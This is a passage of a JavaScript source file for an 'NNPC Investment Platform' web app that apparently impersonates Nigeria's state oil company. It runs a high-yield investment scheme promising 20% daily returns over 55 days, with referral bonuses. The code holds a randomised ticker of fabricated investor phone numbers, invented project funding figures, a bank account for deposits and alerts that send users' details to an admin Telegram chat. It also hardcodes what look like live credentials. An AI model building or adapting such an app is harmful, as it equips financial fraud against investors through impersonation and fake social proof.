// Firebase CDN SDK — imports MUST be at the very top of an ES module
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
import {
  getAuth, createUserWithEmailAndPassword, signInWithEmailAndPassword,
  signOut, onAuthStateChanged, updateProfile
} from "https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js";
import {
  getFirestore, doc, getDoc, setDoc, updateDoc, addDoc, collection,
  query, where, orderBy, getDocs, onSnapshot, serverTimestamp,
  increment, limit, Timestamp
} from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";

// ============================================================
//  NNPC INVESTMENT PLATFORM — app.js
//  Replace the firebaseConfig below with YOUR Firebase project
//  credentials from https://console.firebase.google.com
// ============================================================

const firebaseConfig = {
  apiKey: "AIzaSyC9jF-ocy6HjsVzWVVlAyXW-4aIFgA79-A",
    authDomain: "crypto-6517d.firebaseapp.com",
    projectId: "crypto-6517d",
    storageBucket: "crypto-6517d.firebasestorage.app",
    messagingSenderId: "60263975159",
    appId: "1:60263975159:web:bd53dcaad86d6ed9592bf2"
};

// Cloudinary config — replace with your Cloudinary credentials
const CLOUDINARY_CLOUD_NAME = "ddtdqrh1b";
const CLOUDINARY_UPLOAD_PRESET = "profile-pictures"; // unsigned preset

// Opay Payment Details — replace with your real details
const PAYMENT_DETAILS = {
  bank: "Opay",
  accountName: "NNPC Investment Platform",
  accountNumber: "9012345678"
};

// Telegram config — replace with YOUR values (see README for how to get these)
const TELEGRAM_BOT_TOKEN    = "8651392929:AAH5DX2iKkEPPxPKCQYPcy8liVkIcVeVDps";       // from @BotFather on Telegram
const TELEGRAM_ADMIN_CHAT_ID = "8664727924";  // your personal Telegram user ID
const TELEGRAM_BOT_USERNAME  = "Nnpc_investment_forum_bot";     // e.g. NNPCInvestBot (no @)

// ============================================================
//  INVESTMENT PLANS CONFIG
// ============================================================
const PLANS = [
  { id: "starter",   name: "Starter",   amount: 4000,      daily: 800,     days: 55, total: 44000,      class: "starter",   emoji: "🌱" },
  { id: "bronze",    name: "Bronze",    amount: 10000,     daily: 2000,    days: 55, total: 110000,     class: "bronze",    emoji: "🥉" },
  { id: "silver",    name: "Silver",    amount: 50000,     daily: 10000,   days: 55, total: 550000,     class: "silver",    emoji: "🥈" },
  { id: "gold",      name: "Gold",      amount: 200000,    daily: 40000,   days: 55, total: 2200000,    class: "gold",      emoji: "🥇" },
  { id: "diamond",   name: "Diamond",   amount: 500000,    daily: 100000,  days: 55, total: 5500000,    class: "diamond",   emoji: "💎" },
  { id: "executive", name: "Executive", amount: 1800000,   daily: 360000,  days: 55, total: 19800000,   class: "executive", emoji: "👑" }
];

const SIGNUP_BONUS = 2000;
const WITHDRAW_DELAY_DAYS = 2;
const PAYMENT_TIMER_MINUTES = 30;

// ============================================================
//  FIREBASE INIT
// ============================================================
const app   = initializeApp(firebaseConfig);
const auth  = getAuth(app);
const db    = getFirestore(app);

// ============================================================
//  GLOBALS
// ============================================================
let currentUser   = null;
let userData      = null;
let paymentTimer  = null;
let onboardIndex  = 0;
let unsubscribeSnapshot = null;
let authInitialized = false; // prevents false logout flash on page load

// ============================================================
//  TELEGRAM NOTIFICATIONS
// ============================================================
async function sendTelegramAlert(message) {
  if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === "YOUR_BOT_TOKEN") return;
  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_ADMIN_CHAT_ID,
        text: message,
        parse_mode: "HTML"
      })
    });
  } catch (_) { /* silent — never block the user */ }
}

// ============================================================
//  UTILITY
// ============================================================
const fmt = n => "₦" + Number(n || 0).toLocaleString("en-NG", { minimumFractionDigits: 2, maximumFractionDigits: 2 });
const fmtShort = n => {
  if (n >= 1e6) return "₦" + (n/1e6).toFixed(1) + "M";
  if (n >= 1e3) return "₦" + (n/1e3).toFixed(0) + "K";
  return fmt(n);
};

function showToast(msg, type = "info") {
  const t = document.getElementById("toast");
  t.textContent = msg;
  t.className = "toast " + type;
  t.classList.add("show");
  setTimeout(() => t.classList.remove("show"), 3500);
}

function showScreen(id) {
  document.querySelectorAll(".screen").forEach(s => s.classList.remove("active"));
  const el = document.getElementById(id);
  if (el) el.classList.add("active");
}

function showTab(tab) {
  document.querySelectorAll(".tab-page").forEach(p => p.classList.remove("active"));
  document.querySelectorAll(".nav-item").forEach(n => n.classList.remove("active"));
  document.getElementById("tab-" + tab)?.classList.add("active");
  document.querySelector(`.nav-item[data-tab="${tab}"]`)?.classList.add("active");
  window.scrollTo(0, 0);
}

function openModal(id) {
  document.getElementById(id)?.classList.add("open");
}

function closeModal(id) {
  document.getElementById(id)?.classList.remove("open");
}

function nextSlide() {
  if (onboardIndex < onboardData.length - 1) {
    onboardIndex++;
    document.getElementById("onboard-slider").style.transform = `translateX(-${onboardIndex * 33.333}%)`;
    renderOnboarding();
  }
}

// Expose all functions called from HTML onclick to global scope
// (required because this file runs as an ES module)
window.showScreen  = showScreen;
window.showTab     = showTab;
window.openModal   = openModal;
window.closeModal  = closeModal;
window.nextSlide   = nextSlide;

// ============================================================
//  ACTIVITY TICKER
// ============================================================
(function initTicker() {
  const phoneSeeds = [
    "0801****4523","0703****8812","0812****2267","0905****1130","0816****7745",
    "0702****3391","0811****5508","0913****4472","0708****9934","0803****6619",
    "0817****2281","0706****8847","0901****5563","0815****3319","0704****7726",
    "0902****8841","0813****4453","0709****1127","0816****6692","0705****2238"
  ];
  const amounts = [
    { label: "₦4,000", plan: "Starter Plan" },
    { label: "₦10,000", plan: "Bronze Plan" },
    { label: "₦50,000", plan: "Silver Plan" },
    { label: "₦200,000", plan: "Gold Plan" },
    { label: "₦500,000", plan: "Diamond Plan" },
    { label: "₦1,800,000", plan: "Executive Plan" },
    { label: "₦4,000", plan: "Starter Plan" },
    { label: "₦10,000", plan: "Bronze Plan" },
    { label: "₦50,000", plan: "Silver Plan" },
    { label: "₦200,000", plan: "Gold Plan" },
  ];
  const times = ["just now","2m ago","5m ago","8m ago","12m ago","15m ago","20m ago","28m ago","34m ago","41m ago"];

  function shuffle(arr) {
    const a = [...arr];
    for (let i = a.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [a[i], a[j]] = [a[j], a[i]];
    }
    return a;
  }

  function buildTicker() {
    const track = document.getElementById("ticker-track");
    if (!track) return;
    const phones  = shuffle(phoneSeeds);
    const entries = amounts.map((a, i) => ({
      phone: phones[i % phones.length],
      amount: a.label,
      plan: a.plan,
      time: times[i % times.length]
    }));
    // Duplicate entries so seamless infinite scroll works
    const items = [...entries, ...entries].map(e => `
      <div class="ticker-item">
        <div class="ticker-dot"></div>
        <span class="ticker-phone">${e.phone}</span>
        <span class="ticker-action">activated</span>
        <span class="ticker-amount">${e.amount}</span>
        <span class="ticker-action">${e.plan}</span>
        <span class="ticker-time">· ${e.time}</span>
      </div>
    `).join('');
    track.innerHTML = items;
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", buildTicker);
  } else {
    buildTicker();
  }
})();

function setLoading(btnId, loading, text = "Continue") {
  const btn = document.getElementById(btnId);
  if (!btn) return;
  btn.disabled = loading;
  btn.innerHTML = loading ? '<span class="spinner"></span> Please wait...' : text;
}

function relativeTime(ts) {
  if (!ts) return "";
  const d = ts.toDate ? ts.toDate() : new Date(ts);
  const diff = (Date.now() - d.getTime()) / 1000;
  if (diff < 60) return "Just now";
  if (diff < 3600) return Math.floor(diff / 60) + "m ago";
  if (diff < 86400) return Math.floor(diff / 3600) + "h ago";
  return Math.floor(diff / 86400) + "d ago";
}

function generateRefCode(uid) {
  return "NNPC" + uid.substring(0, 6).toUpperCase();
}

// ============================================================
//  ONBOARDING
// ============================================================
const onboardData = [
  {
    tag: "Nigeria's Trusted Platform",
    title: "Invest in <span>NNPC</span> Energy Projects",
    desc: "Join thousands of Nigerians growing their wealth through certified NNPC infrastructure investments. Secure, transparent, and profitable.",
    imgUrl: "https://images.unsplash.com/photo-1518709268805-4e9042af9f23?w=600&q=80"
  },
  {
    tag: "Daily Returns",
    title: "Earn <span>Daily</span> Returns on Your Capital",
    desc: "Watch your money grow every day. Our 55-day investment plans deliver consistent daily earnings — from ₦800 to ₦360,000 per day.",
    imgUrl: "https://images.unsplash.com/photo-1473341304170-971dccb5ac1e?w=600&q=80"
  },
  {
    tag: "Clean Energy Future",
    title: "Power Nigeria's <span>Green</span> Future",
    desc: "Fund solar mini-grids, gas distribution, and clean energy infrastructure projects that transform communities across Nigeria.",
    imgUrl: "https://images.unsplash.com/photo-1497435334941-8c899ee9e8e9?w=600&q=80"
  }
];

function renderOnboarding() {
  const slider = document.getElementById("onboard-slider");
  slider.innerHTML = onboardData.map((d, i) => `
    <div class="onboard-slide">
      <div class="onboard-img-placeholder">
        <img class="bg-img" src="${d.imgUrl}" alt="" loading="lazy" onerror="this.style.display='none'">
        <div class="onboard-overlay"></div>
        <div class="nnpc-badge">
          <div class="logo-circle">N</div>
          <div class="logo-text">NNPC INVEST</div>
        </div>
      </div>
      <div class="onboard-content">
        <div class="onboard-tag">${d.tag}</div>
        <h2 class="onboard-title">${d.title}</h2>
        <p class="onboard-desc">${d.desc}</p>
        <div class="onboard-dots">
          ${onboardData.map((_, j) => `<div class="dot ${j === i ? 'active' : ''}"></div>`).join('')}
        </div>
        ${i < 2
          ? `<button class="btn-next" onclick="nextSlide()">Next</button>
             <button class="btn-skip" onclick="showScreen('screen-login')">Skip</button>`
          : `<button class="btn-next" onclick="showScreen('screen-register')">Get Started — It's Free</button>
             <button class="btn-skip" onclick="showScreen('screen-login')">Already have an account? Sign in</button>`}
      </div>
    </div>
  `).join('');
}

// ============================================================
//  AUTH — REGISTER
// ============================================================
document.getElementById("form-register")?.addEventListener("submit", async e => {
  e.preventDefault();
  const fullName = document.getElementById("reg-name").value.trim();
  const phone    = document.getElementById("reg-phone").value.trim();
  const email    = document.getElementById("reg-email").value.trim();
  const password = document.getElementById("reg-password").value;
  const refBy    = document.getElementById("reg-ref").value.trim().toUpperCase();

  if (!fullName || !email || !password || !phone) return showToast("Fill all required fields", "error");
  if (password.length < 6) return showToast("Password must be 6+ characters", "error");

  setLoading("btn-register", true);
  try {
    const cred = await createUserWithEmailAndPassword(auth, email, password);
    await updateProfile(cred.user, { displayName: fullName });

    const uid = cred.user.uid;
    const refCode = generateRefCode(uid);

    // Check referral
    let referredByUid = null;
    if (refBy) {
      const refQ = await getDocs(query(collection(db, "users"), where("referralCode", "==", refBy)));
      if (!refQ.empty) {
        referredByUid = refQ.docs[0].id;
      }
    }

    // Create user document
    await setDoc(doc(db, "users", uid), {
      uid, fullName, email, phone,
      referralCode: refCode,
      referredBy: referredByUid,
      balance: 0,            // funded when admin approves a deposit
      bonusBalance: SIGNUP_BONUS, // signup bonus — withdrawable after first deposit
      referralBalance: 0,    // referral commissions — immediately withdrawable
      earningsBalance: 0,    // plan daily earnings — withdrawable after Day 2
      totalInvested: 0,
      totalEarnings: 0,
      activePlan: null,
      planStartDate: null,
      planDaysElapsed: 0,
      depositMade: false,
      referralBonusPaid: false,
      telegramLinked: false,
      kycStatus: "none",
      status: "active",
      createdAt: serverTimestamp()
    });

    // Signup bonus transaction
    await addDoc(collection(db, "transactions"), {
      uid, type: "bonus", amount: SIGNUP_BONUS,
      description: "Welcome bonus",
      status: "completed", createdAt: serverTimestamp()
    });

    // Notify admin on Telegram
    await sendTelegramAlert(
      `🆕 <b>New User Registered</b>\n👤 ${fullName}\n📱 ${phone}\n📧 ${email}\n🔗 Ref by: ${referredByUid || "None"}`
    );

    // Show Telegram join prompt
    showToast(`Welcome ${fullName}! ₦2,000 bonus added 🎉`, "success");
    setTimeout(() => openModal("modal-telegram-prompt"), 1200);
  } catch (err) {
    showToast(err.message.replace("Firebase: ", ""), "error");
    setLoading("btn-register", false);
  }
});

// ============================================================
//  AUTH — LOGIN
// ============================================================
document.getElementById("form-login")?.addEventListener("submit", async e => {
  e.preventDefault();
  const email    = document.getElementById("login-email").value.trim();
  const password = document.getElementById("login-password").value;
  if (!email || !password) return showToast("Enter email and password", "error");

  setLoading("btn-login", true);
  try {
    await signInWithEmailAndPassword(auth, email, password);
  } catch (err) {
    showToast("Invalid email or password", "error");
    setLoading("btn-login", false);
  }
});

// ============================================================
//  AUTH STATE
// ============================================================
onAuthStateChanged(auth, async user => {
  if (user) {
    currentUser = user;
    authInitialized = true;
    await loadUserData(user.uid);
    showScreen("screen-app");
    showTab("home");
    document.getElementById("full-loader").style.display = "none";
  } else {
    // On first load Firebase briefly emits null before resolving the session.
    // Only show the login screen after the SDK has confirmed the auth state.
    if (authInitialized) {
      if (unsubscribeSnapshot) { unsubscribeSnapshot(); unsubscribeSnapshot = null; }
      currentUser = null;
      userData = null;
      showScreen("screen-login");
    }
    document.getElementById("full-loader").style.display = "none";
    authInitialized = true;
  }
});

// ============================================================
//  LOAD USER DATA + REALTIME
// ============================================================
async function loadUserData(uid) {
  if (unsubscribeSnapshot) unsubscribeSnapshot();
  let prevReferralBalance = null; // track to detect incoming referral credits

  unsubscribeSnapshot = onSnapshot(doc(db, "users", uid), async snap => {
    if (!snap.exists()) return;
    const newData = snap.data();

    // Detect a new referral bonus credit using localStorage so it works even
    // when the bonus was credited while the user was offline.
    const storageKey = `lastRefBal_${uid}`;
    const newRefBal  = newData.referralBalance || 0;
    const lastSeen   = parseFloat(localStorage.getItem(storageKey) || "0");
    if (newRefBal > lastSeen) {
      showReferralCreditPopup(newRefBal - lastSeen);
    }
    localStorage.setItem(storageKey, String(newRefBal));

    userData = newData;

    // Credit daily earnings if plan active
    await creditDailyEarnings();

    renderDashboard();
    renderProfile();
  });
}

function showReferralCreditPopup(amount) {
  // Remove any existing popup first
  document.getElementById("referral-credit-popup")?.remove();

  const popup = document.createElement("div");
  popup.id = "referral-credit-popup";
  popup.style.cssText = `
    position:fixed; top:50%; left:50%; transform:translate(-50%,-50%);
    background:#fff; border-radius:20px; padding:32px 28px; text-align:center;
    z-index:9999; box-shadow:0 20px 60px rgba(0,0,0,0.25); max-width:300px; width:90%;
    animation: popIn 0.35s cubic-bezier(0.34,1.56,0.64,1);
  `;
  popup.innerHTML = `
    <div style="font-size:48px;margin-bottom:12px">🎉</div>
    <div style="font-size:18px;font-weight:700;color:#1a1a2e;margin-bottom:8px">Referral Bonus Received!</div>
    <div style="font-size:28px;font-weight:800;color:#22c55e;margin-bottom:12px">${fmt(amount)}</div>
    <div style="font-size:14px;color:#666;margin-bottom:24px">
      Someone you referred just made their first investment.<br>
      Your referral bonus is <b>ready to withdraw now!</b>
    </div>
    <button onclick="document.getElementById('referral-credit-popup')?.remove(); document.getElementById('referral-popup-backdrop')?.remove();"
      style="background:linear-gradient(135deg,#22c55e,#16a34a);color:#fff;border:none;
             border-radius:12px;padding:12px 32px;font-size:15px;font-weight:700;cursor:pointer;width:100%">
      Awesome! 🙌
    </button>
  `;

  const backdrop = document.createElement("div");
  backdrop.id = "referral-popup-backdrop";
  backdrop.style.cssText = `
    position:fixed;inset:0;background:rgba(0,0,0,0.5);z-index:9998;
  `;
  backdrop.onclick = () => { popup.remove(); backdrop.remove(); };

  // Inject keyframe if not already added
  if (!document.getElementById("popIn-style")) {
    const style = document.createElement("style");
    style.id = "popIn-style";
    style.textContent = `@keyframes popIn { from { opacity:0; transform:translate(-50%,-50%) scale(0.7); } to { opacity:1; transform:translate(-50%,-50%) scale(1); } }`;
    document.head.appendChild(style);
  }

  document.body.appendChild(backdrop);
  document.body.appendChild(popup);
}

// ============================================================
//  DAILY EARNINGS ENGINE
// ============================================================
async function creditDailyEarnings() {
  const uid = currentUser?.uid;   // capture early — guards against mid-flight auth changes
  if (!uid || !userData || !userData.activePlan || !userData.planStartDate) return;

  const plan = PLANS.find(p => p.id === userData.activePlan);
  if (!plan) return;

  const startDate = userData.planStartDate.toDate ? userData.planStartDate.toDate() : new Date(userData.planStartDate);
  const now = new Date();
  const daysSinceStart = Math.floor((now - startDate) / (1000 * 60 * 60 * 24));
  const daysToCredit = Math.min(daysSinceStart, plan.days);
  const alreadyCredited = userData.planDaysElapsed || 0;

  if (daysToCredit > alreadyCredited && daysToCredit <= plan.days) {
    const newDays = daysToCredit - alreadyCredited;
    const earningsToAdd = newDays * plan.daily;

    await updateDoc(doc(db, "users", uid), {
      earningsBalance: increment(earningsToAdd),
      totalEarnings: increment(earningsToAdd),
      planDaysElapsed: daysToCredit
    });

    for (let d = alreadyCredited + 1; d <= daysToCredit; d++) {
      await addDoc(collection(db, "transactions"), {
        uid,
        type: "earning",
        amount: plan.daily,
        description: `Day ${d} earnings — ${plan.name} Plan`,
        status: "completed",
        createdAt: serverTimestamp()
      });
    }

    // End plan if complete
    if (daysToCredit >= plan.days) {
      await updateDoc(doc(db, "users", uid), {
        activePlan: null, planStartDate: null
      });
      showToast(`🎉 Your ${plan.name} plan completed! ₦${plan.total.toLocaleString()} earned!`, "success");
    }
  }
}

// ============================================================
//  RENDER DASHBOARD
// ============================================================
function renderDashboard() {
  if (!userData) return;

  const totalBalance = (userData.balance || 0) + (userData.bonusBalance || 0) + (userData.earningsBalance || 0);

  // Portfolio card
  document.getElementById("portfolio-value").textContent = fmt(totalBalance);
  document.getElementById("stat-earnings").textContent = fmtShort(userData.totalEarnings || 0);
  document.getElementById("stat-invested").textContent = fmtShort(userData.totalInvested || 0);
  document.getElementById("stat-bonus").textContent = fmtShort((userData.balance || 0) + (userData.bonusBalance || 0));

  // Header
  const name = userData.fullName || currentUser?.displayName || "Investor";
  document.getElementById("header-name").textContent = name.split(" ")[0];
  document.getElementById("profile-avatar-letter").textContent = name[0].toUpperCase();

  // Active plan progress
  const epSection = document.getElementById("earnings-progress-section");
  if (userData.activePlan) {
    const plan = PLANS.find(p => p.id === userData.activePlan);
    if (plan) {
      const elapsed = userData.planDaysElapsed || 0;
      const pct = (elapsed / plan.days) * 100;
      epSection.style.display = "block";
      document.getElementById("ep-plan-name").textContent = `${plan.name} Plan`;
      document.getElementById("ep-earned").textContent = fmt(elapsed * plan.daily);
      document.getElementById("ep-fill").style.width = pct + "%";
      document.getElementById("ep-days").textContent = `Day ${elapsed} of ${plan.days}`;
    }
  } else {
    epSection.style.display = "none";
  }

  // Load transactions
  loadTransactions();
}

// ============================================================
//  TRANSACTIONS
// ============================================================
async function loadTransactions() {
  const uid = currentUser.uid;
  // Client-side sort avoids Firestore composite index requirement
  const snap = await getDocs(query(collection(db, "transactions"), where("uid", "==", uid)));
  const txns = snap.docs.map(d => d.data())
    .sort((a, b) => (b.createdAt?.seconds || 0) - (a.createdAt?.seconds || 0))
    .slice(0, 8);

  const icons = { deposit: "💰", withdraw: "📤", earning: "📈", bonus: "🎁", referral: "🤝" };
  const container = document.getElementById("txn-list");
  if (txns.length === 0) {
    container.innerHTML = '<div class="empty-state"><div class="empty-icon">💳</div><div class="empty-title">No transactions yet</div><div class="empty-text">Make your first deposit to start earning</div></div>';
    return;
  }
  container.innerHTML = txns.map(t => `
    <div class="txn-item">
      <div class="txn-icon ${t.type}">${icons[t.type] || "💳"}</div>
      <div class="txn-info">
        <div class="txn-name">${t.description}</div>
        <div class="txn-date">${relativeTime(t.createdAt)}</div>
      </div>
      <div class="txn-amount ${t.type === 'withdraw' ? 'neg' : 'pos'}">
        ${t.type === 'withdraw' ? '-' : '+'}${fmt(t.amount)}
      </div>
    </div>
  `).join('');
}

// ============================================================
//  RENDER PLANS
// ============================================================
function renderPlans() {
  const container = document.getElementById("plan-cards-container");
  container.innerHTML = PLANS.map(p => `
    <div class="plan-card ${p.class}">
      <div class="plan-badge">${p.emoji} ${p.name}</div>
      <div class="plan-top">
        <div>
          <div class="plan-invest">${fmtShort(p.amount)}</div>
          <div class="plan-invest-label">Capital Required</div>
        </div>
        <div class="plan-roi-badge">
          ${fmt(p.daily)}<small>per day</small>
        </div>
      </div>
      <div class="plan-stats">
        <div class="plan-stat">
          <div class="plan-stat-val">${p.days}</div>
          <div class="plan-stat-lbl">Days</div>
        </div>
        <div class="plan-stat">
          <div class="plan-stat-val">${fmtShort(p.daily)}</div>
          <div class="plan-stat-lbl">Daily</div>
        </div>
        <div class="plan-stat">
          <div class="plan-stat-val">${fmtShort(p.total)}</div>
          <div class="plan-stat-lbl">Total</div>
        </div>
      </div>
      <div class="plan-bar"><div class="plan-bar-fill" style="width:${Math.min(100, (p.amount/18000)*100+20)}%"></div></div>
      <button class="btn-invest" onclick="selectPlan('${p.id}')">
        Invest ${fmt(p.amount)}
      </button>
    </div>
  `).join('');
}

window.selectPlan = function(planId) {
  if (!userData?.depositMade) {
    showToast("Make your first deposit to activate a plan", "error");
    return openModal("modal-deposit");
  }
  if (userData?.activePlan) {
    const current = PLANS.find(p => p.id === userData.activePlan);
    showToast(`You already have an active ${current?.name} plan`, "error");
    return;
  }
  const plan = PLANS.find(p => p.id === planId);
  document.getElementById("invest-plan-name").textContent = plan.name + " Plan";
  document.getElementById("invest-amount").textContent = fmt(plan.amount);
  document.getElementById("invest-daily").textContent = fmt(plan.daily) + "/day";
  document.getElementById("invest-total").textContent = fmt(plan.total);
  document.getElementById("btn-confirm-invest").onclick = () => confirmInvestment(planId);
  openModal("modal-invest");
};

window.confirmInvestment = async function(planId) {
  const plan = PLANS.find(p => p.id === planId);
  const bal = (userData?.balance || 0) + (userData?.bonusBalance || 0) + (userData?.earningsBalance || 0);
  if (bal < plan.amount) {
    showToast("Insufficient balance — please make a deposit", "error");
    closeModal("modal-invest");
    return openModal("modal-deposit");
  }
  setLoading("btn-confirm-invest", true, "Confirm Investment");
  try {
    const isFirstInvestment = !userData.referralBonusPaid && userData.referredBy;

    await updateDoc(doc(db, "users", currentUser.uid), {
      activePlan: planId,
      planStartDate: serverTimestamp(),
      planDaysElapsed: 0,
      totalInvested: increment(plan.amount),
      balance: increment(-plan.amount),
      ...(isFirstInvestment ? { referralBonusPaid: true } : {})
    });
    await addDoc(collection(db, "transactions"), {
      uid: currentUser.uid, type: "deposit",
      amount: plan.amount,
      description: `${plan.name} Plan Activation`,
      status: "completed", createdAt: serverTimestamp()
    });

    // Pay referrer ₦2,000 to referralBalance (immediately withdrawable) on first investment only
    if (isFirstInvestment) {
      const REFERRAL_BONUS = 2000;
      await updateDoc(doc(db, "users", userData.referredBy), {
        referralBalance: increment(REFERRAL_BONUS),
        totalEarnings: increment(REFERRAL_BONUS)
      });
      await addDoc(collection(db, "transactions"), {
        uid: userData.referredBy,
        type: "referral",
        amount: REFERRAL_BONUS,
        description: `Referral bonus — ${userData.fullName} made their first investment`,
        status: "completed",
        createdAt: serverTimestamp()
      });
    }

    closeModal("modal-invest");
    showToast(`🎉 ${plan.name} Plan activated! Earnings start now.`, "success");
    showTab("home");
  } catch (err) {
    showToast(err.message, "error");
  }
  setLoading("btn-confirm-invest", false, "Confirm Investment");
};

// ============================================================
//  PROJECTS
// ============================================================
const PROJECTS = [
  {
    name: "Solar Mini-Grids",
    tag: "Clean Energy",
    desc: "Powering 500+ rural communities across Nigeria with sustainable solar mini-grid infrastructure, reducing energy poverty and creating jobs.",
    target: 5000000000,
    raised: 3750000000,
    investors: 12847,
    roi: "20% daily",
    imgUrl: "https://images.unsplash.com/photo-1509391366360-2e959784a276?w=600&q=80",
    emoji: "☀️"
  },
  {
    name: "Gas Distribution Network",
    tag: "Gas Infrastructure",
    desc: "Expanding Nigeria's gas distribution network to serve industrial and domestic consumers, reducing gas flaring by 40% in target regions.",
    target: 12000000000,
    raised: 8400000000,
    investors: 28460,
    roi: "20% daily",
    imgUrl: "https://images.unsplash.com/photo-1587691592099-24045742c181?w=600&q=80",
    emoji: "🔥"
  },
  {
    name: "Clean Energy Infrastructure",
    tag: "Renewable Energy",
    desc: "Building Nigeria's largest wind and hydro energy infrastructure project, targeting 2GW of clean energy capacity by 2026.",
    target: 25000000000,
    raised: 11750000000,
    investors: 45230,
    roi: "20% daily",
    imgUrl: "https://images.unsplash.com/photo-1466611653911-95081537e5b7?w=600&q=80",
    emoji: "💨"
  },
  {
    name: "Agricultural Fuel Supply",
    tag: "AgriEnergy",
    desc: "Dedicated fuel supply chain for Nigerian agricultural sector — ensuring 24/7 power for irrigation, processing plants, and cold storage.",
    target: 3500000000,
    raised: 2100000000,
    investors: 8910,
    roi: "20% daily",
    imgUrl: "https://images.unsplash.com/photo-1625246333195-78d9c38ad449?w=600&q=80",
    emoji: "🌾"
  }
];

function renderProjects() {
  const container = document.getElementById("project-cards-container");
  container.innerHTML = PROJECTS.map(p => {
    const pct = Math.round((p.raised / p.target) * 100);
    return `
      <div class="project-card">
        <div style="position:relative; overflow:hidden;">
          <img class="project-img" src="${p.imgUrl}" alt="${p.name}" loading="lazy" onerror="this.style.display='none'; this.nextElementSibling.style.display='flex'">
          <div class="project-img-placeholder" style="display:none">${p.emoji}</div>
        </div>
        <div class="project-body">
          <span class="project-tag">${p.tag}</span>
          <div class="project-name">${p.name}</div>
          <div class="project-desc">${p.desc}</div>
          <div class="project-progress">
            <div class="progress-labels">
              <span class="progress-raised">${fmtShort(p.raised)} raised</span>
              <span class="progress-target">Target: ${fmtShort(p.target)}</span>
            </div>
            <div class="progress-bar"><div class="progress-fill" style="width:${pct}%"></div></div>
          </div>
          <div class="project-stats">
            <div class="proj-stat"><span>${pct}%</span> funded</div>
            <div class="proj-stat"><span>${p.investors.toLocaleString()}</span> investors</div>
            <div class="proj-stat">ROI: <span>${p.roi}</span></div>
          </div>
        </div>
      </div>
    `;
  }).join('');
}

// ============================================================
//  EARNINGS CALCULATOR
// ============================================================
window.calculateEarnings = function() {
  const amount = parseFloat(document.getElementById("calc-amount").value);
  const planId  = document.getElementById("calc-plan").value;
  if (!amount || amount <= 0) return showToast("Enter a valid amount", "error");

  const plan = PLANS.find(p => p.id === planId);
  const daily  = (amount / plan.amount) * plan.daily;
  const total  = daily * plan.days;

  document.getElementById("calc-plan-name").textContent = plan.name + " Plan";
  document.getElementById("calc-daily-ret").textContent = fmt(daily);
  document.getElementById("calc-duration").textContent = plan.days + " days";
  document.getElementById("calc-total-ret").textContent = fmt(total);
  document.getElementById("calc-capital").textContent = fmt(amount);
  document.getElementById("calc-net").textContent = fmt(total - amount);
  document.getElementById("calc-result").classList.add("show");
};

// ============================================================
//  DEPOSIT MODULE
// ============================================================
let depositFileUrl = null;

window.openDepositModal = function() {
  document.getElementById("deposit-amount-input").value = "";
  document.getElementById("file-preview-dep").classList.remove("show");
  depositFileUrl = null;
  openModal("modal-deposit");
};

document.getElementById("deposit-upload-area")?.addEventListener("click", () => {
  document.getElementById("deposit-file-input").click();
});

document.getElementById("deposit-file-input")?.addEventListener("change", async e => {
  const file = e.target.files[0];
  if (!file) return;
  document.getElementById("dep-upload-text").textContent = "Uploading...";
  const url = await uploadToCloudinary(file);
  if (url) {
    depositFileUrl = url;
    document.getElementById("file-preview-dep").classList.add("show");
    document.getElementById("file-preview-dep-name").textContent = file.name;
    document.getElementById("dep-upload-text").textContent = "✓ Receipt uploaded";
    showToast("Receipt uploaded successfully", "success");
  }
});

async function uploadToCloudinary(file) {
  const fd = new FormData();
  fd.append("file", file);
  fd.append("upload_preset", CLOUDINARY_UPLOAD_PRESET);
  try {
    const res = await fetch(`https://api.cloudinary.com/v1_1/${CLOUDINARY_CLOUD_NAME}/upload`, { method: "POST", body: fd });
    const data = await res.json();
    return data.secure_url;
  } catch {
    showToast("Upload failed. Check your Cloudinary config.", "error");
    return null;
  }
}

document.getElementById("btn-submit-deposit")?.addEventListener("click", async () => {
  const amount = parseFloat(document.getElementById("deposit-amount-input").value);
  if (!amount || amount < 1000) return showToast("Minimum deposit is ₦1,000", "error");
  if (!depositFileUrl) return showToast("Please upload your payment receipt", "error");

  setLoading("btn-submit-deposit", true, "Submit Deposit");
  try {
    await addDoc(collection(db, "deposits"), {
      uid: currentUser.uid,
      userName: userData.fullName,
      userEmail: userData.email,
      phone: userData.phone || "",
      amount,
      receiptUrl: depositFileUrl,
      status: "pending",
      createdAt: serverTimestamp()
    });

    // Notify admin on Telegram
    await sendTelegramAlert(
      `💰 <b>New Deposit Request</b>\n👤 ${userData.fullName}\n📱 ${userData.phone || "N/A"}\n📧 ${userData.email}\n💵 ₦${amount.toLocaleString()}\n🧾 Receipt submitted`
    );

    closeModal("modal-deposit");
    showToast("Deposit submitted! Awaiting admin approval.", "success");
  } catch (err) {
    showToast(err.message, "error");
  }
  setLoading("btn-submit-deposit", false, "Submit Deposit");
});

// ============================================================
//  PAYMENT PAGE (with timer)
// ============================================================
window.showPaymentPage = function() {
  document.getElementById("pay-bank").textContent = PAYMENT_DETAILS.bank;
  document.getElementById("pay-name").textContent = PAYMENT_DETAILS.accountName;
  document.getElementById("pay-number").textContent = PAYMENT_DETAILS.accountNumber;
  closeModal("modal-deposit");
  openModal("modal-payment");
  startPaymentTimer();
};

function startPaymentTimer() {
  clearInterval(paymentTimer);
  let secs = PAYMENT_TIMER_MINUTES * 60;
  updateTimerDisplay(secs);
  paymentTimer = setInterval(() => {
    secs--;
    updateTimerDisplay(secs);
    if (secs <= 0) {
      clearInterval(paymentTimer);
      closeModal("modal-payment");
      showToast("Payment time expired. Please try again.", "error");
    }
  }, 1000);
}

function updateTimerDisplay(secs) {
  const m = Math.floor(secs / 60).toString().padStart(2, "0");
  const s = (secs % 60).toString().padStart(2, "0");
  document.getElementById("timer-display").textContent = `${m}:${s}`;
}

window.copyAccountNumber = function() {
  navigator.clipboard.writeText(PAYMENT_DETAILS.accountNumber).then(() => showToast("Account number copied!", "success"));
};

window.donePayment = function() {
  clearInterval(paymentTimer);
  closeModal("modal-payment");
  openModal("modal-deposit");
